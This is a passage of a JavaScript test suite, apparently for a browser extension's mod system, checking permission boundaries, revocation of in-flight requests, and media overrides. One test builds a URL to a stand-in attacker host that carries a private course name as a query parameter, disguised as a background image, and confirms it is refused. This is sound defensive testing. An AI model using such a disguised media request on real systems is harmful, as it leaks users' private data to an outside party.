  const cache = source.slice(source.indexOf('const modKept ='), source.indexOf('chrome.runtime.onMessage.addListener', source.indexOf('const modKept =')));
  let changed;
  const data = { modsBlocklist: { list: { mods: [ID] }, sig: 'checked', seq: 1 } };
  const ctx = vm.createContext({ GZ_MODBROKER: B, Map, chrome: { storage: { local: area(data), onChanged: { addListener(f) { changed = f; } } } } });
  vm.runInContext(`${cache}\nthis.read = modRead;`, ctx);
  assert.deepEqual(await ctx.read('modsBlocklist'), { mods: [ID] });
  data.modsBlocklist = { list: { authors: ['k1'] }, sig: 'checked', seq: 2 };
  changed({ modsBlocklist: { newValue: data.modsBlocklist } }, 'local');
  assert.deepEqual(await ctx.read('modsBlocklist'), { authors: ['k1'] });
  assert.match(source, /blocklist: \(\) => modRead\('modsBlocklist'\)/);
});


test('a data mod cannot expose its cached data through a later frame-only update', async () => {
  const e = env({ local: { [`insights:${SITE}/5`]: { at: 1, courses: [{ id: '1', name: 'PRIVATE', trend: [[1, 97]] }] } } });
  const grades = await call(e, 'grades');
  assert.equal(grades.value[0].name, 'PRIVATE');
  await call(e, 'storage.set', ['cached', grades.value]);
  e.local.data[`mod:${ID}`] = rec({ grants: {}, manifest: { name: 'Frame update', permissions: [], ui: { tiles: [{ id: 'tile', file: 'ui.html' }] }, hooks: 'hooks.js' }, files: { 'hooks.js': Buffer.from('void 0').toString('base64'), 'ui.html': Buffer.from('<p>').toString('base64') } });
  assert.deepEqual((await B.page({ op: 'list' }, e)).mods[0].slots, [{ key: 'tile:tile', name: '', size: 's', file: null }], 'the same mod id remains Worker-only after using data');
  assert.deepEqual(await call(e, 'storage.get', ['cached'], { via: 'frame:tiles:tile' }), { ok: false, error: 'permission' });
  assert.equal((await call(e, 'storage.get', ['cached'])).value[0].name, 'PRIVATE', 'the Worker keeps its stored data');
});

test('a Look override cannot turn private data into an undeclared media request', async () => {
  const e = env({ local: { seenCourses: { _1_1: { name: 'PRIVATE', site: SITE } } } });
  const courses = await call(e, 'courses');
  const src = `https://attacker.example/background.webp?name=${courses.value[0].name}`;
  for (const type of ['image', 'video', 'lottie']) {
    assert.deepEqual(await call(e, 'look.override', [{ bg: { media: { type, src } } }]), { ok: false, error: 'permission' }, type);
  }
});

test('code media overrides reuse only the manifest source and type, including local files', async () => {
  for (const src of ['https://media.example/background.webp', `file:${'a'.repeat(43)}`]) {
    for (const type of ['image', 'video', 'lottie']) {
      const parts = { bg: { media: { type, src } } };
      const e = env({ record: rec({ manifest: { permissions: [], parts }, grants: {} }), local: { [`modPrivate:${ID}`]: true } });
      const override = { bg: { media: { type, src, fit: 'contain', dim: 25, loop: false } } };
      assert.deepEqual(await call(e, 'look.override', [override]), { ok: true, value: override }, 'the fixed source keeps runtime controls');
      assert.deepEqual(await call(e, 'look.override', [{ bg: { media: { type: type === 'image' ? 'video' : 'image', src } } }]), { ok: false, error: 'permission' }, 'a source cannot change parser');
    }
  }
  const e = env();
  for (const src of ['https://api.weather.gov/background.webp?private=1', `file:${'b'.repeat(43)}`]) {
    assert.deepEqual(await call(e, 'look.override', [{ bg: { media: { type: 'image', src } } }]), { ok: false, error: 'permission' }, 'neither a network grant nor a guessed local hash authorizes a dynamic source');
  }
  assert.deepEqual(await call(e, 'look.override', [null]), { ok: true, value: null });
});


for (const revoke of [{ [`mod:${ID}`]: { newValue: { enabled: false } } }, { modDev: { newValue: false } }]) test(`revocation ${Object.keys(revoke)[0]} aborts an in-flight broker fetch, including its response body`, async () => {
  const source = fs.readFileSync(path.join(__dirname, '../lib/background.js'), 'utf8');
  const code = source.slice(source.indexOf('const modKept ='), source.indexOf('// Code on demand', source.indexOf('const modKept =')));
  const e = env();
  let message, signal, finish;
  const changes = [];
  const ctx = vm.createContext({
    GZ_MODBROKER: B, AbortController, DOMException, Map, Set, setTimeout, clearTimeout,
    fromLms: async () => SITE, brokerArea: (name) => e[name], brokerTurn: null, GZ_CARDS: { queue: () => e.queue },
    fetch: async (url, init) => { signal = init.signal; return new Promise((r) => { finish = r; }); },
    chrome: { runtime: { onMessage: { addListener(f) { message = f; } } }, storage: { local: e.local, onChanged: { addListener(f) { changes.push(f); } } } },
  });
  vm.runInContext(code, ctx);
  const answer = new Promise((resolve) => message({ type: 'glaze:mod', mod: ID, via: 'worker', call: 'fetch', args: ['https://api.weather.gov/'] }, {}, resolve));
  while (!signal) await flush();
  for (const changed of changes) changed(revoke, 'local');
  try { assert.equal(signal.aborted, true, 'the granted request stops when its mod is disabled'); }
  finally { finish(body('done')); await answer; }
});


test('revocation during a data read or queued write releases neither data nor a stale mutation', async () => {
  const control = new AbortController();
  const e = { ...env({ local: { seenCourses: { _1_1: { name: 'PRIVATE', site: SITE } } } }), signal: control.signal };
  const get = e.local.get;
  e.local.get = async (k) => { const v = await get(k); if (k === 'seenCourses') control.abort(); return v; };
  assert.deepEqual(await call(e, 'courses'), { ok: false, error: 'cancelled' });
  const c = new AbortController(), w = { ...env(), signal: c.signal };
  w.queue = async (f) => { c.abort(); return f(); };
  assert.deepEqual(await call(w, 'storage.set', ['stale', 1]), { ok: false, error: 'cancelled' });
  assert.equal(w.local.data[`modData:${ID}`], undefined);
});


test('a storage read crossed by revocation retries instead of returning a stale grant', async () => {
  const source = fs.readFileSync(path.join(__dirname, '../lib/background.js'), 'utf8');
  const code = source.slice(source.indexOf('const modKept ='), source.indexOf('chrome.runtime.onMessage.addListener', source.indexOf('const modKept =')));
  let changed, release, first = true;
  const data = { [`mod:${ID}`]: rec() };
  const local = area(data), get = local.get;
  local.get = async (key) => { const value = await get(key); if (first) { first = false; await new Promise((r) => { release = r; }); } return value; };
  const ctx = vm.createContext({ GZ_MODBROKER: B, Map, chrome: { storage: { local, onChanged: { addListener(f) { changed = f; } } } } });
  vm.runInContext(`${code}\nthis.read = modRead;`, ctx);
  const reading = ctx.read(`mod:${ID}`);
  while (!release) await flush();
  data[`mod:${ID}`] = rec({ enabled: false });
  changed({ [`mod:${ID}`]: { newValue: data[`mod:${ID}`] } }, 'local');
  release();
  assert.equal(await reading, null);
});

test('the worker cancels an in-flight declarative widget read on revocation', async () => {
  const source = fs.readFileSync(path.join(__dirname, '../lib/background.js'), 'utf8');
  const code = source.slice(source.indexOf('const modKept ='), source.indexOf('// Code on demand', source.indexOf('const modKept =')));
  const e = env();
  let message, signal, finish;
  const changes = [];
  const ctx = vm.createContext({
    GZ_MODBROKER: { ...B, page: async (m, env) => { signal = env.signal; return new Promise((r) => { finish = r; }); } },
    AbortController, DOMException, Map, Set, setTimeout, clearTimeout, brokerIn() {},
    fromLms: async () => SITE, brokerArea: (name) => e[name], brokerTurn: null, GZ_CARDS: { queue: () => e.queue },
    chrome: { runtime: { onMessage: { addListener(f) { message = f; } } }, storage: { local: e.local, onChanged: { addListener(f) { changes.push(f); } } } },
  });
  vm.runInContext(code, ctx);
  const answer = new Promise((resolve) => message({ type: 'glaze:modpage', op: 'widget', mod: ID, slot: 'tile:main' }, {}, resolve));
  while (!finish) await flush();
  try {
    assert.ok(signal, 'widget reads join the revocation queue');
    for (const changed of changes) changed({ [`mod:${ID}`]: { newValue: { grants: {} } } }, 'local');
    assert.equal(signal.aborted, true);
  } finally { finish({ ok: false, error: 'cancelled' }); await answer; }
});

test('the page is told every on mod\'s Look parts, cleaned, in order, code or none, on every browser', async () => {
  const look = (over) => rec({ files: {}, manifest: { glaze: 1, name: 'Look', permissions: [], ...over } });
  const a = look({ parts: { cursor: { kind: 'glow' }, rules: [{ p: 'ultra.course-card.title', do: 'hide' }] } });
  const b = { ...look({ parts: { cursor: { kind: 'trail' } } }), id: OTHER };
  const e = env({ record: a, local: { mods: [ID, OTHER], [`mod:${OTHER}`]: b } });
  const parts = async (x = e) => (await B.page({ op: 'parts' }, x)).parts;
  assert.deepEqual(await parts(), [a.manifest.parts, { cursor: { kind: 'trail' } }], 'no hooks, no slots: still a mod');
  assert.deepEqual((await B.page({ op: 'list' }, e)).mods, [], 'nothing to start');
  e.local.data.modOrder = [OTHER];
  assert.deepEqual((await parts()).map((x) => x.cursor.kind), ['trail', 'glow'], 'the student\'s order');
  for (const bad of [{ cursor: { kind: 'laser' } }, { cursor: { kind: 'trail' }, bogus: 1 }, 'x', [1]]) {
    e.local.data[`mod:${OTHER}`] = { ...b, manifest: { ...b.manifest, parts: bad } };
    assert.deepEqual(await parts(), [a.manifest.parts], 'parts that don\'t clean are none');
  }
  e.local.data[`mod:${OTHER}`] = { ...b, enabled: false };
  assert.equal((await parts()).length, 1, 'off');
  e.local.data[`mod:${OTHER}`] = { ...b, dev: true };
  assert.equal((await parts()).length, 1, 'a dev copy with dev mode off');
  e.local.data.modDev = true;
  assert.equal((await parts()).length, 2, 'a dev copy with dev mode on');
  assert.deepEqual(await parts({ ...e, blocklist: async () => ({ mods: [ID] }) }), [{ cursor: { kind: 'trail' } }], 'blocklisted');
  e.local.data[`mod:${OTHER}`] = { ...b, blocked: true };
  assert.equal((await parts()).length, 1);
  assert.deepEqual(await B.page({ op: 'parts' }, { ...e, site: null }), { ok: false, error: 'sender' }, 'quiz, tool and non-LMS pages are refused by the sender check');
  assert.deepEqual(await B.page({ op: 'parts' }, env({ local: { mods: 'x' } })), { ok: true, parts: [] });
});
